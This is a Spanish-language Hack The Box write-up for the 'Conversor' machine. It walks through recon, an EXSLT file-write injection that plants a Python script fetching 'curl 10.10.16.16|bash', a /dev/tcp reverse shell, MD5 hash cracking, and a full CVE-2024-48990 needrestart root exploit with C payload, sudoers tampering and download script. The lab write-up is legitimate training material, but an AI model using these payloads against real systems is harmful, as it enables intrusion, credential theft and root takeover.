---
layout: post
title: Conversor - Hack The Box
date: 2025-10-29
categories: [htb, linux]
tags:  [Linux]
image:
  path: htb-writeup-conversor/conversor.png
  alt: conversor
---

![logo](htb-writeup-conversor/conversor-logo.png){: .right w="200" h="200" }

La maquina conversor de Hack The Box es de dificultad Facil, primero nos encontramos con una aplicacion web alojada en el puerto 80 donde atravez de metodos de `FUZZEO` captamos un comprimido `source_code.tar.gz` en ella nos encontramos con el codigo fuente de la web, esta app llamada `conversor` funciona subiendo un archivo `xml` y por otro lado un `xslt` obteniendo como resultado un enlace donde te da un estilo final a la informacion que contiene tu `xml`. Esta app es vulnerable a `EXSLT` fue asi como logramos la intrusion a la maquina. En este punto estando como el usuario `www-data` capturamos un hash MD5 del usuario `fismathack` y asi pivoteando a otro privilegio, luego enumerando por los permisos `SUDOERS` como el usuario `fismathack` observamos que el usuario puede ejecutar el binario `needstart` en su version 3.7 vulnerable a `Local Privilege Escalation` y de esa manera conseguimos el root.


## Reconocimiento

### Nmap

Primero vamos a empezar con un escaneo rapido y preciso para dar con los puertos abiertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.123.234

Completed SYN Stealth Scan at 13:21, 35.05s elapsed (65535 total ports)
Nmap scan report for 10.129.123.234
Host is up, received user-set (6.6s latency).
Scanned at 2025-10-29 13:21:08 CET for 35s
Not shown: 54025 filtered tcp ports (no-response), 11508 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 35.13 seconds
           Raw packets sent: 130476 (5.741MB) | Rcvd: 46357 (1.854MB)
```

```bash
PORT -> 22 SSH
PORT -> 80 HTTP 
```

### Nmap Servicios y Puertos

```bash
nmap -p22,80 -sCV 10.129.123.234

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 13:36 CET
Nmap scan report for 10.129.123.234
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.21 seconds
```

Cuando realizamos el escaneo de los servicios que corren en los puertos, nos encontramos con el dominio de la maquina victima. Vamos a escribirlo en el `/etc/hosts` para que la IP nos resuelva la web.

```bash
echo "10.129.123.234 conversor.htb" >> /etc/hosts
```

## Web 

![](htb-writeup-conversor/conversor1.png)

```bash
curl -I http://conversor.htb
HTTP/1.1 302 FOUND
Date: Wed, 29 Oct 2025 12:45:41 GMT
Server: Apache/2.4.52 (Ubuntu)
Content-Length: 199
Location: /login
Content-Type: text/html; charset=utf-8
```

Si realizamos un curl a la web para extraer un poco mas de info, nos encontramos con un `apache 2.4`. Tambien observamos un panel de registro y login. 

Vamos a registrarnos y ver que esconde esta aplicacion web.

![](htb-writeup-conversor/conversor2.png)

![](htb-writeup-conversor/conversor3.png)

Muy bien, al parecer trata de una web que convierte un archivo XML a algo mas estetico... se refiere a algun reporte que se puede sacar con `nmap`. Se me ocurren muchos vectores de ataque para esta web, una de ellas seria un XXE (External Entity Injection) o tambien si no valida las extensiones se puede subir un `SVG` y derivarlo a un `SSRF`...  En otras palabras se pueden probar muchas cosas en esta aplicacion. Pero vamos por partes

```bash
echo "eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6Im1yaW5jcmVpYmxlIn0.aQINpQ.QDBv9-vaxTbncb9y6Ak4EPT0MKI" | base64 -d | jq
{
  "user_id": 5,
  "username": "mrincreible"
}
```

En mi token vemos esa informacion

### Enumeracion Web Fuzz

```bash
wfuzz -c --hc=404 --hh=2767 -t 100 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://conversor.htb/FUZZ' -H 'Cookie: session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6Im1yaW5jcmVpYmxlIn0.aQINpQ.QDBv9-vaxTbncb9y6Ak4EPT0MKI'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://conversor.htb/FUZZ
Total requests: 4746

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================

000000466:   200        80 L     214 W      2838 Ch     "about"                                                                                                    
000002334:   301        9 L      28 W       319 Ch      "javascript"                                                                                               
000002529:   200        21 L     50 W       722 Ch      "login"                                                                                                    
000002544:   302        5 L      22 W       199 Ch      "logout"                                                                                                   
000003498:   200        20 L     50 W       726 Ch      "register"                                                                                                 
000003736:   403        9 L      28 W       278 Ch      "server-status"                                                                                            

Total time: 0
Processed Requests: 4746
Filtered Requests: 4740
Requests/sec.: 0
```

Sin exito, solo conseguimos esto... vamos a profundizar con otra herramienta como Feroxbuster

```bash
feroxbuster --url http://conversor.htb --cookies 'session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6Im1yaW5jcmVpYmxlIn0.aQINpQ.QDBv9-vaxTbncb9y6Ak4EPT0MKI'
                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://conversor.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🤯  Header                │ Cookie: session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6Im1yaW5jcmVpYmxlIn0.aQINpQ.QDBv9-vaxTbncb9y6Ak4EPT0MKI
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        5l       22w      199c http://conversor.htb/logout => http://conversor.htb/login
200      GET      107l      197w     3216c http://conversor.htb/static/nmap.xslt
405      GET        5l       20w      153c http://conversor.htb/convert
200      GET      290l      652w     5938c http://conversor.htb/static/style.css
200      GET       81l      214w     2842c http://conversor.htb/about
200      GET       79l      214w     2768c http://conversor.htb/
200      GET       22l       50w      722c http://conversor.htb/login
200      GET       21l       50w      726c http://conversor.htb/register
301      GET        9l       28w      319c http://conversor.htb/javascript => http://conversor.htb/javascript/
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      362l     2080w   178136c http://conversor.htb/static/images/fismathack.png
200      GET        0l        0w  1688968c http://conversor.htb/static/images/arturo.png
200      GET        0l        0w  4085760c http://conversor.htb/static/source_code.tar.gz
200      GET        0l        0w  2229125c http://conversor.htb/static/images/david.png
301      GET        9l       28w      326c http://conversor.htb/javascript/jquery => http://conversor.htb/javascript/jquery/
200      GET        0l        0w   288550c http://conversor.htb/javascript/jquery/jquery
```

En este escaneo con `Feroxbuster` tenemos que pasarle nuestro token con el parametro --cookies. Encontramos algo jugoso expuesto... `source_code.tar.gz`

Vamos a traerlo a nuestra maquina y descomprimirlo, haber si podemos aprovecharnos de alguna vulnerabilidad. 

### Source Code (Analisis de Codigo Fuente)

```bash
sudo tar -xvf source_code.tar.gz
app.py
app.wsgi
install.md
instance/
instance/users.db
scripts/
static/
static/images/
static/images/david.png
static/images/fismathack.png
static/images/arturo.png
static/nmap.xslt
static/style.css
templates/
templates/register.html
templates/about.html
templates/index.html
templates/login.html
templates/base.html
templates/result.html
uploads/
```

```bash
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""

```

Antes de empezar con el analisis de codigo, vamos a probar la funcion de como convierte los archivos `xml` y `xslt`.

![](htb-writeup-conversor/conversor4.png)

![](htb-writeup-conversor/conversor5.png)

Excelente!!!... Convierte los escaneos en un formato agradable a la vista y se ve muy bien. PERO

Analizando su contenido, nos encontramos con un archivo `install.md` que al parecer contiene una tarea cron que ejecuta cada minuto esto `* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done`, ejecuta todos los scripts que se encuentren en esa carpeta.

### app.py

```python
@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"
```

Este es el codigo de app.py, en el destacamos la funcion `convert` por lo siguiente:

1. Comprueba y analiza el XSLT proporcionado por el usuario
2. Luego utiliza ese XSLT para transformar el XML

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html" indent="yes" />

  <xsl:template match="/">
    <html>
      <head>
        <title>Nmap Scan Results</title>
        <style>
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(120deg, #141E30, #243B55);
            color: #eee;
            margin: 0;
            padding: 0;
          }
          h1, h2, h3 {
            text-align: center;
            font-weight: 300;
          }
          .card {
            background: rgba(255, 255, 255, 0.05);
            margin: 30px auto;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            width: 80%;
          }
          table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
          }
          th, td {
            padding: 10px;
            text-align: center;
          }
          th {
            background: rgba(255,255,255,0.1);
            color: #ffcc70;
            font-weight: 600;
            border-bottom: 2px solid rgba(255,255,255,0.2);
          }
          tr:nth-child(even) {
            background: rgba(255,255,255,0.03);
          }
          tr:hover {
            background: rgba(255,255,255,0.1);
          }
          .open {
            color: #00ff99;
            font-weight: bold;
          }
          .closed {
            color: #ff5555;
            font-weight: bold;
          }
          .host-header {
            font-size: 20px;
            margin-bottom: 10px;
            color: #ffd369;
          }
          .ip {
            font-weight: bold;
            color: #00d4ff;
          }
        </style>
      </head>
      <body>
        <h1>Nmap Scan Report</h1>
        <h3><xsl:value-of select="nmaprun/@args"/></h3>

        <xsl:for-each select="nmaprun/host">
          <div class="card">
            <div class="host-header">
              Host: <span class="ip"><xsl:value-of select="address[@addrtype='ipv4']/@addr"/></span>
              <xsl:if test="hostnames/hostname/@name">
                (<xsl:value-of select="hostnames/hostname/@name"/>)
              </xsl:if>
            </div>
            <table>
              <tr>
                <th>Port</th>
                <th>Protocol</th>
                <th>Service</th>
                <th>State</th>
              </tr>
              <xsl:for-each select="ports/port">
                <tr>
                  <td><xsl:value-of select="@portid"/></td>
                  <td><xsl:value-of select="@protocol"/></td>
                  <td><xsl:value-of select="service/@name"/></td>
                  <td>
                    <xsl:attribute name="class">
                      <xsl:value-of select="state/@state"/>
                    </xsl:attribute>
                    <xsl:value-of select="state/@state"/>
                  </td>
                </tr>
              </xsl:for-each>
            </table>
          </div>
        </xsl:for-each>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

Este `XSLT` que nos proporciona la web es el estilo que nos da cuando le pasamos un archivo `XML`, buscando por [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

Nos encontramos con un apartado que se llama [Write Files with EXSLT Extension](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection#write-files-with-exslt-extension)

### XSLT - EXSLT (Write File)

Es un conjunto de extensiones del lenguaje XSLT (Transformaciones Extensibles de Lenguaje de Hojas de Estilo).

1. XSLT -> Es un lenguaje de programación (sorprendentemente complejo) escrito en XML, diseñado para transformar un documento XML a otro formato (como HTML).
2. ¿Qué es libxml2? Es la biblioteca C subyacente que utiliza el módulo lxml de Python (y muchos otros analizadores) para manejar XML y XSLT.
3. ¿Qué es EXSLT? Se trata de un conjunto de extensiones de XSLT para dotarlo de mayor potencia (como funciones de fecha y hora, manipulación de cadenas, etc.).
4. Vulnerabilidad: libxml2 admite un espacio de nombres XSLT peligroso: http://exslt.org/common. Este espacio de nombres incluye la función `<shell:document>`. Esta función permitía que la transformación XSLT generara su resultado en varios archivos.
5. PoC: El atributo href de `<shell:document>` es vulnerable. Puede aceptar una ruta de archivo absoluta. El procesador XSLT (ejecuta como www-data) escribira sin problemas el contenido de la etiqueta shell:document en cualquier archivo del sistema que tenga permisos de escritura.

Sabiendo todo esto buscar un metodo de intrusion es sencilla, vamos a crear un archivo `xml` con nmap y tambien vamos a sacar el exploit que se encuentra en `Payload All The Things`

```bash
nmap -sC -oX nmap.xml 10.129.123.234
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:shell="http://exslt.org/common" 
  extension-element-prefixes="shell"
  version="1.0">
  <xsl:template match="/">
    <shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("curl 10.10.16.16|bash")      
    </shell:document>
  </xsl:template>
</xsl:stylesheet>
```


Este `XSLT` va a escribir un archivo .py en la carpeta `/var/www/conversor.htb/scripts/`, existe una tarea cron antes mencionada que se ejecuta cada 1 minuto.

Esta tarea se va a ejecutar y me dara acceso al sistema

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.16/443 0>&1
```

Crearemos este pequeño script y guardarlo como index.html en nuestro sistema y en la misma carpeta donde tenemos este script vamos levantar un servidor con python

```bash
python3 -m http.server 80
```

Tambien vamos a estar escuchando con `netcat` por el puerto 443 

```bash
nc -nlvp 443
```

![](htb-writeup-conversor/conversor6.png)

![](htb-writeup-conversor/conversor7.png)

ESTO ES GENIAL!!!!! Ya conseguimos una shell y estamos ejecutando comandos dentro del sistema!!!... Esta vulnerabilidad esta MUY BUENA!!!

## Escalada de Privilegios

### Shell como www-data

Como primer punto inicial, vamos a enumerar por a nivel de RED donde nos ubicamos 

```bash
www-data@conversor:~$ hostname -I
10.129.123.234 
www-data@conversor:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.123.234  netmask 255.255.0.0  broadcast 10.129.255.255
        ether 00:50:56:b0:23:8f  txqueuelen 1000  (Ethernet)
        RX packets 206732  bytes 21548291 (21.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 173074  bytes 27972619 (27.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 30398  bytes 2161114 (2.1 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 30398  bytes 2161114 (2.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

www-data@conversor:~$
```

Podemos decir que en un contenedor de docker no estamos

```bash
www-data@conversor:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22
```

Tampoco encontramos puertos internos abiertos

Otra manera de enumerar mas a fondo y escalar privilegios es probar el `LinPEAS` pero en este caso vamos a terminar las vias que tenemos nosotros a la hora de enumerar.

```bash
www-data@conversor:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

Esta tarea programada nos dio acceso al servidor, este es un error de los desarrolladores y propio de un `SYSADMIN`. Al dejar expuesto un endpoint donde me da acceso a descargar el codigo fuente de la app.

En el source_code.tar.gz que descargue, en la carpeta `instance` habia un `users.db`, pero su contenido era totalmente escaso de usuarios. Sin embargo una vez dentro del sistema encontramos esto.

```bash
www-data@conversor:~/conversor.htb/instance$ sqlite3 users.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|mrincreible|a9a6b0fd059846acf67ac475b98f0474
sqlite> .schema users
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    );
sqlite>
``` 

```bash
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|mrincreible|a9a6b0fd059846acf67ac475b98f0474
```

### Shell como fismathack

Al parecer parecen hashes en `MD5`, vamos a pasarselo a `crackstation`

![](htb-writeup-conversor/conversor8.png)

Y sin ninguna duda se logra romper el hash, obtuvimos la contraseña del usuario `fismathack`

```bash
fismathack@conversor:~$ id
uid=1000(fismathack) gid=1000(fismathack) groups=1000(fismathack)
fismathack@conversor:~$ whoami
fismathack
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

Esto es excelente, conseguimos escalar privilegios a un usuario valido a nivel de sistema. Y tambien vemos que tiene permisos para ejecutar como ROOT el binario `/usr/sbin/needrestart`

### SUDO

```bash
fismathack@conversor:~$ /usr/sbin/needrestart -v
[main] eval /etc/needrestart/needrestart.conf
[main] needrestart v3.7
[main] running in user mode
[Core] Using UI 'NeedRestart::UI::stdio'...
[main] systemd detected
[main] vm detected
[main] inside container or vm, skipping microcode checks
```

Vemos la version v3.7 de needrestart.. indagando un poco por google nos encontramos que esa version es vulnerablo a un Local Privilege Escalation... que coincidencia es justo lo que necesitamos. JAJAJA

Me encontre con este PoC que lo explica bien y desglosa no tan a bajo nivel pero se entiende bien por donde va la explotacion.

## CVE-2024-48990

PoC -> [CVE-needrestart](https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing)

Voy a tratar de explicar lo mejor posible el funcionamiento de este PoC ya que nadie lo hace o quizas por mi escaso ingles lo entendi leyendo muchas veces.

### Compilacion de Lib.c

Primero construi este lib.c para despues compilarlo

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void a() __attribute__((constructor));

void a() {
	if(getuid() == 0) {
		setuid(0);
		setgid(0);
		const char *shell = "cp /bin/bash /tmp/poc; "
				    "chmod u+s /tmp/poc; "
				    "grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || "
				    "echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers > /dev/null &";
		system(shell);
	}

}
```

```bash
gcc -shared -fPIC -o __init__.so lib.c
```

Se me creo la compilacion final llamado `__init__.so`. Pero no termina aca

Luego saque esta parte de python del PoC

```python
import time
while True:
    try:
        import importlib
    except:
        pass
    if __import__("os").path.exists("/tmp/poc"):
        print("Got shell!, delete traces in /tmp/poc, /tmp/malicious")
        __import__("os").system("sudo /tmp/poc -p")
        break
    time.sleep(1)
```

Y lo guarde como `e.py`

Ahora me falta crear un script que automatize la transferencia de estos 2 archivos hacia la maquina victima.

### Script Bash Automatizacion

```bash
#!/bin/bash

set -e
cd /tmp

mkdir -p malicious/importlib

curl http://10.10.16.8/__init__.so -o /tmp/malicious/importlib/__init__.so
curl http://10.10.16.8/e.py -o /tmp/malicious/e.py

cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
```

Este script se va a ubicar en la carpeta /tmp y va a crear la carpeta `malicious/importlib`, luego va a descargar los archivos y lo guardara en diferentes carpetas.

Y por ultimo va a ejecutar con una variable de entorno `(PYTHONPATH="$PWD")` el `e.py` 2>/dev/null, el bucle que ejecuta el script e.py se va a parar cuando ejecutemos desde otra terminal `sudo /usr/sbin/needrestart` escalando privilegios como root y viendo la ultima flag.

![](htb-writeup-conversor/conversor9.png)



